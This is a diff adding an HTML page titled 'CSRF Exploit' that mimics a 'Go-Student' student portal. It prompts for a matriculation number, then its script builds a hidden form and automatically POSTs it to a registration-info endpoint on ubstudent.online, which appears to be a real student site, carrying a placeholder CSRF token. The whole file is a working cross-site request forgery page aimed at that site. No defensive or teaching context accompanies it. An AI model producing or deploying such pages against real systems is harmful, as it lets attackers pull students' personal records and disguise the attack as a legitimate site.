@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Exploit</title>
+    <style>
+        /* Basic styling to match the blue-themed website */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        .header {
+            background-color: #0078d7;
+            color: white;
+            padding: 15px 20px;
+            text-align: center;
+        }
+        .container {
+            max-width: 600px;
+            margin: 30px auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            font-weight: bold;
+            display: block;
+            margin-bottom: 5px;
+        }
+        input[type="text"], button {
+            width: 100%;
+            padding: 10px;
+            margin-top: 5px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        button {
+            background-color: #0078d7;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            border: none;
+        }
+        button:hover {
+            background-color: #005bb5;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Go-Student</h1>
+    </div>
+    <div class="container">
+        <h2>Enter Matriculation Number</h2>
+        <form id="csrf-form">
+            <div class="form-group">
+                <label for="matricule">Matriculation No:</label>
+                <input type="text" id="matricule" name="matricule" placeholder="Enter Matricule (e.g., FE22A287)">
+            </div>
+            <button type="button" onclick="submitCSRF()">Submit</button>
+        </form>
+    </div>
+
+    <script>
+        function submitCSRF() {
+            const matricule = document.getElementById("matricule").value;
+
+            if (!matricule) {
+                alert("Please enter a valid matriculation number.");
+                return;
+            }
+
+            // Create a hidden form to simulate the CSRF attack
+            const form = document.createElement("form");
+            form.method = "POST"; // Assuming POST is required
+            form.action = `https://ubstudent.online/student/get_student_reg_info?matricule=${encodeURIComponent(matricule)}`;
+
+            // Add hidden input fields (e.g., CSRF token if needed)
+            const csrfToken = document.createElement("input");
+            csrfToken.type = "hidden";
+            csrfToken.name = "_token";
+            csrfToken.value = "fake-csrf-token"; // Simulated token
+            form.appendChild(csrfToken);
+
+            // Automatically submit the form
+            document.body.appendChild(form);
+            form.submit();
+        }
+    </script>
+</body>
+</html>
